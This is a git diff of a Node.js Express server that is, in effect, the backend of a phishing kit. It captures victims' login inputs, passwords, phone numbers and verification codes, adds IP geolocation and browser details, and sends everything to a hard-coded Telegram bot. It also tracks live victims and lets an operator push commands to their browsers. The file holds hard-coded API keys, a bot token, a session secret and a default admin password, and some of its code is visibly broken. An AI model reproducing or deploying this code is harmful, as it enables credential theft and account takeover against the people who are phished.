@@ -1,169 +1,530 @@
 const express = require('express');
-const http = require('http');
-const WebSocket = require('ws');
-const sqlite3 = require('sqlite3').verbose();
 const bodyParser = require('body-parser');
+const sqlite3 = require('sqlite3').verbose();
+const axios = require('axios');
+const { sendMessageFor } = require('simple-telegram-message');
+const crypto = require('crypto');
 const path = require('path');
+const fs = require('fs').promises;
+const session = require('express-session');
 
 const app = express();
-const server = http.createServer(app);
-const wss = new WebSocket.Server({ port: 8080 });
+const port = process.env.PORT || 3000;
 
-// Initialize in-memory SQLite database
+// Constants for API details
+const API_URL = 'https://api-bdc.net/data/ip-geolocation?ip=';
+const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
+const botToken = "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4";
+const chatId = "5200289419";
+
+app.use(session({
+    secret: "3f73f14e9b29c8f5a6c1d3ee67d2a8a42a99e02e3f5b678d3d6a81f96b4873a2",
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: false } // Set to true if using HTTPS
+}));
+
+app.use(express.static('public'));
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// Initialize SQLite database
 const db = new sqlite3.Database(':memory:');
 
-// Middleware
-app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, 'public')));
+// Insert default admin credentials
+const defaultUsername = 'admin';
+const defaultPassword = 'updateteam'; // Remember to hash passwords for security
+const hashedPassword = crypto.createHash('sha256').update(defaultPassword).digest('hex');
 
-
-wss.on('connection', function connection(ws, req) {
-  const ip = req.connection.remoteAddress;
-  console.log('Client connected from IP:', ip);
-
-  // Handle incoming messages from clients
-  ws.on('message', function incoming(message) {
-    console.log('Received message:', message);
-    
-    // Example: Broadcast message to all connected clients
-    wss.clients.forEach(function each(client) {
-      if (client.readyState === WebSocket.OPEN) {
-        client.send(message);
-      }
-    });
-  });
-});
-
-// Initialize database schema
 db.serialize(() => {
-    db.run("CREATE TABLE clients (clientId TEXT PRIMARY KEY, ip TEXT, inputs TEXT, command TEXT, timestamp INTEGER)");
-    db.run("CREATE TABLE stats (type TEXT PRIMARY KEY, count INTEGER)");
-    db.run("INSERT INTO stats (type, count) VALUES ('visitors', 0), ('bots', 0), ('humans', 0)");
+    db.run("CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, inputs TEXT, ip TEXT)");
+  db.run("CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, stats TEXT)");
+  db.run("CREATE TABLE IF NOT EXISTS admin (username TEXT PRIMARY KEY, password TEXT)");
+  
+    db.get("SELECT * FROM admin WHERE username = ?", [defaultUsername], (err, row) => {
+        if (err) {
+            console.error(`Error checking admin: ${err.message}`);
+            return;
+        }
+        if (!row) {
+            // Insert default admin credentials if they don't already exist
+            db.run("INSERT INTO admin (username, password) VALUES (?, ?)", [defaultUsername, hashedPassword], (err) => {
+                if (err) {
+                    console.error(`Error inserting default admin credentials: ${err.message}`);
+                } else {
+                    console.log('Default admin credentials inserted successfully');
+                }
+            });
+        } else {
+            console.log('Default admin credentials already exist');
+        }
+    });
 });
 
-// WebSocket connection handler
-wss.on('connection', (ws, req) => {
-    const urlParams = new URLSearchParams(req.url.replace('/?', ''));
-    const clientId = urlParams.get('clientId');
-    const isAdmin = urlParams.get('admin') === 'true';
 
-    if (isAdmin) {
-        ws.isAdmin = true;
-        sendAdminUpdate(ws);
+let visitors = 0;
+let humans = 0;
+let bots = 0;
+let stats = '';
+let clients = {};
+let adminClient = null;
+let currPage = "";
+let message = '';
+function resetVisits(){
+    visitors = 0;
+}
 
-        ws.on('message', (message) => {
-            const { clientId, command } = JSON.parse(message);
-            db.run("UPDATE clients SET command = ? WHERE clientId = ?", [command, clientId], () => {
-                broadcastToClients({ type: 'command', clientId, command });
-            });
-        });
-    } else if (clientId) {
-        db.run("INSERT OR REPLACE INTO clients (clientId, ip, inputs, command, timestamp) VALUES (?, ?, ?, ?, ?)", 
-            [clientId, req.socket.remoteAddress, '', 'not', Date.now()]);
-        
-        db.run("UPDATE stats SET count = count + 1 WHERE type = 'visitors'");
 
-        ws.on('message', (message) => {
-            const data = JSON.parse(message);
-            if (data.type === 'heartbeat') {
-                db.run("UPDATE clients SET timestamp = ? WHERE clientId = ?", [Date.now(), clientId], () => {
-                    db.get("SELECT command FROM clients WHERE clientId = ?", [clientId], (err, row) => {
-                        ws.send(JSON.stringify({ command: row.command || 'not' }));
+
+function addClientToDatabase(clientId, ip) {
+    visitors++;
+    humans++;
+    db.run("INSERT INTO clients (id, inputs, ip) VALUES (?, ?, ?)", [clientId, JSON.stringify({}), ip], (err) => {
+        if (err) {
+            console.error(`Error adding client ${clientId}: ${err.message}`);
+        } else {
+            console.log(`Client ${clientId} with IP ${ip} added to the database`);
+        }
+    });
+}
+
+function addStatsToDatabase(stats) {
+    db.run("INSERT INTO stats (stats_json) VALUES (?)", [stats], (err) => {
+        if (err) {
+            console.error(`Error adding stats: ${err.message}`);
+        } else {
+            console.log(`Stats added to the stats table`);
+        }
+    });
+}
+
+function removeClientFromDatabase(clientId) {
+    db.run("DELETE FROM clients WHERE id = ?", [clientId], (err) => {
+        if (err) {
+            console.error(`Error removing client ${clientId}: ${err.message}`);
+        } else {
+            console.log(`Client ${clientId} removed from the database`);
+        }
+    });
+}
+
+function updateClientInputs(clientId, inputs) {
+    db.run("UPDATE clients SET inputs = ? WHERE id = ?", [JSON.stringify(inputs), clientId], (err) => {
+        if (err) {
+            console.error(`Error updating inputs for client ${clientId}: ${err.message}`);
+        }
+    });
+}
+
+function getClientData(callback) {
+    db.all("SELECT * FROM clients", (err, rows) => {
+        if (err) {
+            console.error(`Error retrieving client data: ${err.message}`);
+            callback([]);
+        } else {
+            callback(rows.map(row => ({ clientId: row.id, inputs: JSON.parse(row.inputs), ip: row.ip })));
+        }
+    });
+}
+
+
+function broadcastAdminPanel(currPage, stats) {
+    getClientData((clientList) => {
+         stats = { visitors, humans, bots };
+         currPage = {currPage};
+        //stats = JSON.stringify(stats); // Update stats globally
+		console.log(stats);
+        const message = JSON.stringify({ type: 'adminUpdate', clientList, currPage, stats }); 
+        console.log(`Broadcasting to admin panel: ${message}`);
+        if (adminClient) {
+            adminClient.write(`data: ${message}\n\n`);
+        } else {
+            console.log('No admin client connected');
+        }
+    });
+}
+
+app.get('/forgot', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'reset.html'));
+});
+
+app.post('/forgot', (req, res) => {
+    const { apiKey, username, newPassword } = req.body;
+    const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');
+
+    db.get("SELECT * FROM api_keys WHERE key = ?", [apiKey], (err, row) => {
+        if (err) {
+            console.error(`Error retrieving API key: ${err.message}`);
+            return res.status(500).send('Error verifying API key');
+        }
+        if (row) {
+            db.get("SELECT * FROM admin WHERE username = ?", [username], (err, row) => {
+                if (err) {
+                    console.error(`Error retrieving admin: ${err.message}`);
+                    return res.status(500).send('Error retrieving admin');
+                }
+                if (row) {
+                    db.run("UPDATE admin SET password = ? WHERE username = ?", [hashedNewPassword, username], (err) => {
+                        if (err) {
+                            console.error(`Error updating password: ${err.message}`);
+                            return res.status(500).send('Error updating password');
+                        }
+                        res.send('Password reset successfully');
                     });
-                });
-            } else if (data.type === 'update') {
-                db.run("UPDATE clients SET inputs = ?, timestamp = ? WHERE clientId = ?", [JSON.stringify(data.inputs), Date.now(), clientId]);
-            }
-        });
+                } else {
+                    res.status(404).send('User not found');
+                }
+            });
+        } else {
+            res.status(401).send('Unauthorized: Invalid API key');
+        }
+    });
+});
 
-        ws.on('close', () => {
-            db.run("DELETE FROM clients WHERE clientId = ?", [clientId]);
-            db.run("UPDATE stats SET count = count - 1 WHERE type = 'visitors'");
-        });
+function getClientIp(req) {
+    const xForwardedFor = req.headers['x-forwarded-for'];
+    if (xForwardedFor) {
+        const ips = xForwardedFor.split(',');
+        return ips[0].trim();
+    }
+    return req.connection.remoteAddress || req.socket.remoteAddress || null;
+}
+
+
+    const sendAPIRequest = async (ipAddress) => {
+        try {
+            const apiResponse = await axios.get(`${API_URL}${ipAddress}&localityLanguage=en&key=${API_KEY}`);
+            return apiResponse.data;
+        } catch (error) {
+            console.error(`Error fetching IP information: ${error.message}`);
+            return null;
+        }
+    };
+
+    
+    //Command sec
+    app.post('/delete-client', (req, res) => {
+  const { clientId } = req.body;
+  if (clientId) {
+    // Remove the client from memory and database
+    if (clients[clientId]) {
+      clients[clientId].end(); // End the SSE connection
+      delete clients[clientId];
+    }
+    removeClientFromDatabase(clientId);
+    broadcastAdminPanel();
+    res.sendStatus(200);
+  } else {
+    res.status(400).send('Missing clientId');
+  }
+});
+    
+app.post('/send-command', (req, res) => {
+  const { clientId, command } = req.body;
+  const client = clients[clientId];
+  if (client) {
+    client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
+  }
+  res.sendStatus(200);
+});
+//command sec end    
+
+
+const HEARTBEAT_INTERVAL = 60000; // 30 seconds
+
+app.post('/heartbeat', (req, res) => {
+    const clientId = req.body.clientId;
+    currPage = req.body.currPage;
+
+    if (clients[clientId]) {
+        // Reset the heartbeat timeout
+        clearTimeout(clients[clientId].timeout);
+        clients[clientId].timeout = setTimeout(() => {
+            console.log(`No heartbeat received from client ${clientId}. Performing action.`);
+            // Perform the desired action here
+            //delete clients[clientId];
+        }, HEARTBEAT_INTERVAL);
+        res.send('true');
+        broadcastAdminPanel(currPage, visitors);
+    } else {
+    	 currPage = "Disconnected";
+    	broadcastAdminPanel(currPage, visitors);
+        //res.status(404).send('Client not found');
     }
 });
 
-// Utility functions
-const broadcastToAdmins = (message) => {
-    wss.clients.forEach((client) => {
-        if (client.isAdmin) {
-            client.send(JSON.stringify(message));
+
+const MAX_RETRIES = 6;
+
+
+async function retryConnection(clientId, retries = MAX_RETRIES) {
+    while (retries > 0) {
+        try {
+            // Attempt to reconnect here. This could be a ping, an HTTP request, etc.
+            console.log(`Attempting to reconnect to client ${clientId}... (${MAX_RETRIES - retries + 1}/${MAX_RETRIES})`);
+            // If reconnect attempt is successful:
+            return true; 
+        } catch (error) {
+            console.log(`Reconnection attempt ${MAX_RETRIES - retries + 1} failed for client ${clientId}`);
         }
-    });
-};
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second before retrying
+        retries--;
+    }
+    console.log(`Failed to reconnect to client ${clientId} after ${MAX_RETRIES} attempts.`);
+    return false;
+}
 
-const broadcastToClients = (message) => {
-    wss.clients.forEach((client) => {
-        if (!client.isAdmin) {
-            client.send(JSON.stringify(message));
+
+
+app.get('/events', (req, res) => {
+    const clientId = req.query.clientId;
+    const isAdmin = req.query.admin === 'true';
+    const clientIp = getClientIp(req);
+    
+    if (currPage === undefined || currPage === null || currPage === "" || currPage === "Disconnected") {
+        currPage = req.query.currPage || "defaultPage"; // Provide a default value if currPage is undefined, null, or an empty string
+    }
+
+    console.log(`Received /events request: clientId=${clientId}, isAdmin=${isAdmin}, ip=${clientIp}`);
+
+    if (clientId || isAdmin) {
+        res.setHeader('Content-Type', 'text/event-stream');
+        res.setHeader('Cache-Control', 'no-cache');
+        res.setHeader('Connection', 'keep-alive');
+
+        if (clientId && !clients[clientId]) {
+            addClientToDatabase(clientId, clientIp);
+            clients[clientId] = res;
+            console.log(`Client ${clientId} connected`);
         }
-    });
-};
 
-const sendAdminUpdate = (ws) => {
-    db.all("SELECT * FROM clients", (err, clients) => {
-        db.all("SELECT * FROM stats", (err, stats) => {
-            const statsObj = stats.reduce((acc, stat) => {
-                acc[stat.type] = stat.count;
-                return acc;
-            }, {});
-            ws.send(JSON.stringify({ type: 'adminUpdate', clientList: clients, stats: statsObj }));
+        if (isAdmin) {
+            adminClient = res;
+            console.log('Admin client connected');
+        }
+
+        req.on('close', async () => {
+            if (clientId) {
+                delete clients[clientId];
+                console.log(`Client ${clientId} disconnected`);
+                const reconnected = await retryConnection(clientId);
+                if (!reconnected) {
+                    console.log(`Unable to re-establish connection with client ${clientId}`);
+                }
+            }
+            if (isAdmin) {
+                adminClient = null;
+                console.log('Admin client disconnected');
+            }
+            broadcastAdminPanel(currPage, visitors); // Pass currPage here
         });
-    });
-};
 
-const updateDatabase = () => {
-    db.all("SELECT * FROM clients", (err, clients) => {
-        db.all("SELECT * FROM stats", (err, stats) => {
-            const statsObj = stats.reduce((acc, stat) => {
-                acc[stat.type] = stat.count;
-                return acc;
-            }, {});
-            broadcastToAdmins({ type: 'adminUpdate', clientList: clients, stats: statsObj });
+        broadcastAdminPanel(currPage, stats); // Pass currPage here
+    } else {
+        res.status(400).send('Invalid clientId or admin query parameter');
+    }
+});
+
+
+app.post('/input', async (req, res) => {
+    try {
+        const { clientId, currPage, inputs } = req.body;
+		
+
+
+        console.log('Received /input request:', req.body);
+        const ipAddress = getClientIp(req);
+        const ipAddressInformation = await sendAPIRequest(ipAddress);
+
+        if (!clientId || typeof inputs !== 'object') {
+            return res.status(400).send('Missing clientId or inputs object');
+        }
+
+        const row = await new Promise((resolve, reject) => {
+            db.get("SELECT id, inputs FROM clients WHERE id = ?", [clientId], (err, row) => {
+                if (err) {
+                    reject(err);
+                } else {
+                    resolve(row);
+                }
+            });
         });
-    });
-};
 
-// Endpoints
-app.post('/input', (req, res) => {
-    const { clientId, ...inputData } = req.body;
-    db.get("SELECT * FROM clients WHERE clientId = ?", [clientId], (err, row) => {
         if (!row) {
-            db.run("INSERT INTO clients (clientId, inputs, command, timestamp) VALUES (?, ?, ?, ?)", 
-                [clientId, JSON.stringify(inputData), 'not', Date.now()]);
-            db.run("UPDATE stats SET count = count + 1 WHERE type = 'visitors'");
-        } else {
-            db.run("UPDATE clients SET inputs = ?, command = 'not', timestamp = ? WHERE clientId = ?", 
-                [JSON.stringify(inputData), Date.now(), clientId]);
+        	console.log("no row");
+            await addClientToDatabase(clientId, ipAddress);
         }
+
+        const existingInputs = row ? JSON.parse(row.inputs) : {};
+        const updatedInputs = { ...existingInputs, ...inputs };
+
+        await updateClientInputs(clientId, updatedInputs);
+        broadcastAdminPanel(currPage, stats);
+
+        if (!ipAddressInformation) {
+            return res.status(500).send('Error retrieving IP information');
+        }
+
+        const userAgent = req.headers["user-agent"];
+        const systemLang = req.headers["accept-language"];
+        //const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
+		
+			if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
+			  `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
+                `👤 LOGIN \n\n`;
+                
+			  const inputKeys = Object.keys(inputs);
+			
+			  // Iterate over each key and access its corresponding value
+			  inputKeys.forEach(key => {
+			  	if (key === 'password') {
+			  		message += `🌍 GEO-IP INFO\n` +
+                `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+                `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+                `CITY             : ${ipAddressInformation.location.city}\n` +
+                `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+                `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+                `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+                `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+                `💻 SYSTEM INFO\n` +
+                `USER AGENT       : ${userAgent}\n` +
+                `SYSTEM LANGUAGE  : ${systemLang}\n` +
+                `💬 Telegram: https://t.me/UpdateTeams\n`;
+				      return;
+				    }
+			    const value = inputs[key];
+			    console.log(`${key}: ${value}\n`);
+			    message += `${key}: ${value}\n`;
+			    
+			  });
+			  const sendMessage = sendMessageFor(botToken, chatId);
+            sendMessage(message);
+            console.log(`message: ${message}`);
+            
+            } else {
+			  console.log('Inputs are empty or not defined.');
+			}
+        
+        
         res.sendStatus(200);
-        updateDatabase();
+    } catch (error) {
+        console.error(`Error processing request: ${error.message}`);
+        res.sendStatus(500);
+    }
+});
+
+
+
+app.post('/process-request', async (req, res) => {
+    try {
+    	
+    } catch (error) {
+        console.error(`Error processing request: ${error.message}`);
+        res.sendStatus(500);
+    }
+});
+
+
+// Setup session middleware
+
+
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+app.get('/code', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'entercode.html'));
+});
+
+app.get('/phone', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'verifyphone.html'));
+});
+
+app.get('/load', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'loading.html'));
+});
+
+// Route to handle the login form submission
+app.post('/admin', (req, res) => {
+    const { username, password } = req.body;
+    console.log('Received login request:', req.body);
+
+    if (!username || !password) {
+        return res.status(400).send('Username and password are required');
+    }
+
+    const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
+    console.log('Hashed password:', hashedPassword);
+
+    db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedPassword], (err, row) => {
+        if (err) {
+            console.error(`Error retrieving admin: ${err.message}`);
+            return res.status(500).send('Error retrieving admin');
+        }
+        if (row) {
+            console.log(row);
+            // Set the session variable
+            req.session.loggedIn = true;
+            // Redirect to the admin dashboard
+            res.redirect('/admin/dashboard');
+        } else {
+            res.status(401).send('Unauthorized: Invalid username or password');
+        }
     });
 });
 
-app.post('/send-command', (req, res) => {
-    const { clientId, command } = req.body;
-    db.run("UPDATE clients SET command = ? WHERE clientId = ?", [command, clientId], () => {
-        broadcastToClients({ type: 'command', clientId, command });
-        res.sendStatus(200);
-        updateDatabase();
+// Middleware to check if user is logged in
+function checkAuth(req, res, next) {
+    if (req.session.loggedIn) {
+        return next();
+    } else {
+        res.status(401).send('Unauthorized: You need to log in first');
+    }
+}
+
+app.get('/admin/dashboard', checkAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+
+// Route to change the admin password
+app.post('/change-password', (req, res) => {
+    const { username, oldPassword, newPassword } = req.body;
+    const hashedOldPassword = crypto.createHash('sha256').update(oldPassword).digest('hex');
+    const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');
+
+    db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedOldPassword], (err, row) => {
+        if (err) {
+            console.error(`Error retrieving admin: ${err.message}`);
+            return res.status(500).send('Error retrieving admin');
+        }
+        if (row) {
+            db.run("UPDATE admin SET password = ? WHERE username = ?", [hashedNewPassword, username], (err) => {
+                if (err) {
+                    console.error(`Error updating password: ${err.message}`);
+                    return res.status(500).send('Error updating password');
+                }
+                res.send('Password changed successfully');
+            });
+        } else {
+            res.status(401).send('Unauthorized: Invalid username or old password');
+        }
     });
 });
 
-app.post('/delete-client', (req, res) => {
-    const { clientId } = req.body;
-    db.run("DELETE FROM clients WHERE clientId = ?", [clientId], () => {
-        db.run("UPDATE stats SET count = count - 1 WHERE type = 'visitors'");
-        res.sendStatus(200);
-        updateDatabase();
-    });
+const apiKeys = new Set(['your_api_key']);
+
+
+// Endpoint to confirm API key
+app.post('/confirm-api', (req, res) => {
+    const { apiKey } = req.body;
+    if (apiKeys.has(apiKey)) {
+        res.json({ success: true });
+    } else {
+        res.status(401).json({ success: false, message: 'Invalid API key' });
+    }
 });
-
-// Periodic admin panel broadcast
-const broadcastAdminPanel = () => {
-    updateDatabase();
-};
-
 
 app.post('/verify', async (req, res) => {
     const { email } = req.body;
@@ -193,27 +554,6 @@ app.post('/verify', async (req, res) => {
 });
 
 
-function updateCurrPage(clientId, currPage, isConnected) {
-    const thisNameElements = document.querySelectorAll('.thisName');
-
-    thisNameElements.forEach(div => {
-        if (div.id === clientId) {
-            console.log("currPage: " + currPage);
-            div.parentElement.children[2].children[1].textContent = isConnected ? currPage : "Disconnected";
-            if (!isConnected) {
-                document.getElementById(`currPage-${clientId}`).previousElementSibling.style.color = "red";
-                document.getElementById(`currPage-${clientId}`).parentElement.children[0].style.backgroundColor = "red";
-            } else {
-                document.getElementById(`currPage-${clientId}`).previousElementSibling.style.color = "";
-                document.getElementById(`currPage-${clientId}`).parentElement.children[0].style.backgroundColor = "green";
-            }
-        }
-    });
-}
-
-setInterval(broadcastAdminPanel, 3000);
-
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+app.listen(port, () => {
+    console.log(`Server running at http://localhost:${port}/`);
 });
